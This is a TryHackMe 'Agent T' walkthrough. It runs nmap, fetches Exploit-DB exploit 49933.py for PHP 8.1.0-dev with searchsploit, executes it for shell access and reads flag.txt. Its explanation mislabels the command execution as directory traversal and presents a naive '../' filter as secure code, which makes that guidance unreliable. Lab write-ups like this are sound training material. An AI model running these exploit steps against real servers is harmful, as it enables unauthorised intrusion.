# Agent-T

Agent T is popular TryHackMe Machine which runs on a old version of PHP and you can exploit it with just simple steps

TryhackMe Machines runs on vulnerable system.It allows us to find the structure of a machine like what type of technology it is using and how can we exploit it.

We just have to join the room and then start the Machine:

![Agent T](https://github.com/user-attachments/assets/7b162025-e363-4914-884e-7e0212574b0c)

Once You Start click "Start Machine" then you have to wait for 60 seconds and then you will have your Machine's IP

![machine ip](https://github.com/user-attachments/assets/71a07d88-0b80-4912-a8ce-00cf04485683)




 Now you have to configure you VPN which you can get from **Manage Account
< VM and VPN Setting**
and then download the Configuration file.

![how to find vpn on try](https://github.com/user-attachments/assets/75205325-6e51-4347-8c06-13e121956619)

![how to find vpn on try1](https://github.com/user-attachments/assets/3849c642-5490-4815-abbe-ed2aba9c3aae)

![how to find vpn on try2](https://github.com/user-attachments/assets/0c3cef80-f90b-4c83-98dd-612fdfb715e5)





Now we have to configure the VPN Properly:

After Downloading the VPM Configuration file run this command
```
sudo openvpn example.ovpn
```

<img width="593" height="247" alt="openvpn" src="https://github.com/user-attachments/assets/67031fa5-da15-46e9-980c-ffd8cb5b8dcd" />

 

**Now we can work on it**

The First step is to enumerate the services and technologies our vulnerable machine is using.

For this I will use Nmap.A powerful tool for network scanning

I will use -A flag for Agressive Scan

```
sudo nmap -A IP
```

I got the results.this machine is running only on port 80.

Port 80 is used for http and the machine is using this partucular technology "**PHP**" version '**PHP 8.1.0-dev**'

`http://IP` And this Result occurs

<img width="1918" height="981" alt="Screenshot 2026-03-07 at 13-01-26 Admin Dashboard" src="https://github.com/user-attachments/assets/fa39d994-7139-45a6-8952-74c4f5338a09" />


Lets check for this particular exploit online

![Exploit](https://github.com/user-attachments/assets/220d757f-8681-4cf1-a971-52a12c2f5439)

Now we have confirmed that this version is vulnerable so we will use **Exploit-DB** for this attack

If you have not instelled the Exploit-db in the kali so 
**Run**
```
sudo apt install exploitdb
```
For Updating database 
```
searchsploit -u
```

**To Use this**

 **Usage** 

**Searchploit | Version name**

**Run**
```
`searchploit PHP 8.1.0-dev`
```

<img width="1853" height="780" alt="exploit-db" src="https://github.com/user-attachments/assets/cfd5888a-f51f-4c89-94ab-42fca1c7ac64" />

There are a lot of exploits here 


But we will this one:
<img width="1771" height="30" alt="PHP-exploit" src="https://github.com/user-attachments/assets/e7ba50c9-a913-4306-8986-c68ee5a416a9" />

**How to install it**

_Searchploit -m 'exploit path'_


**Run**
```
searchploit -m php/webapps/49933.py
```
It will be installed in your machine


<img width="764" height="248" alt="download-searchploit exploit" src="https://github.com/user-attachments/assets/571b76ec-f98d-41ff-bd4b-7442a2b8468c" />

Now we have organize it professionally

Important:
When we install any exploit so it stores like 49933.py so we have to rename it so we remember that
```
mv 49933.py PHP-8.1.0-dev.py

# Then Make a directory

mkdir PHP-8.1.0-dev

# change path of the exploit

cp PHP-8.1.0-dev.py PHP-8.1.0-dev
```
Now our exploit is in the PHP-8.1.0-dev directory


<img width="469" height="258" alt="in the directory" src="https://github.com/user-attachments/assets/fc8cdf20-3b03-4901-a775-8fb7f31d0d2a" />

**Lets Interact with it**
```
python3 PHP-8.1.0-dev.py
```

It is asking for full host url


<img width="471" height="107" alt="they" src="https://github.com/user-attachments/assets/70994402-7601-4063-89b1-b1f4cc768484" />

copy the host from your browser and then paste here

**http://IP**  then press enter


Now we have gained the access

<img width="697" height="298" alt="gained the access" src="https://github.com/user-attachments/assets/d7381cc9-2f5d-4ced-be72-1eaecceb7f22" />

**lets search for the flag**

As you know I used the ls command but it didn't show me anything

<img width="248" height="311" alt="if we hit ls" src="https://github.com/user-attachments/assets/e7cec287-de76-4fc3-9259-cb71fe1af1da" />

So we will use this:

`../../../../../../../`

**Lets understand what it is ??**

After using `ls` command we didn't get anything because this is actually a classic vulnerability called **Directory Traversal** (Path Traversal)
You probably got no useful output because the web application was only allowing you to see files inside a restricted directory.Example:

`/var/www/html/files/`

So the application might internally run something like:

`ls /var/www/html/files/`

Meaning you can only see files inside files/.

When you use:

`../` 

so you will You go up one directory:

`/var/www/html/`

if you repeat:

`../../`

You go up two levels:

`/var/www/`

If you keep repeating it:

`../../../../../../`

Eventually you reach the root directory `/`

When you used:

`../../../../../../..`

You escaped the restricted folder.

Instead of:

`/var/www/html/files/`

the server interpreted something like:

`/var/www/html/files/../../../../../../`

Linux resolves it to:

`/`

So now the command effectively became:

`ls /`

Which lists the entire root filesystem.

Example output:
```
bin
boot
dev
etc
flag.txt
home
lib
opt
root
tmp
usr
var
````

So you bypassed the directory restriction.

Now see you can see the flag.txt

**To view the flag.txt file**

`cat ../../../../../../../flag.txt`

 and you will get the flag:
 
 `flag{##################}`

 **Why the Website Allowed This**

The vulnerability exists because the application did not sanitize user input.

Secure code should block `../`

Example secure filter:

```
if "../" in user_input:
    reject()
```
    

But the vulnerable application allowed it, so you could escape the intended directory




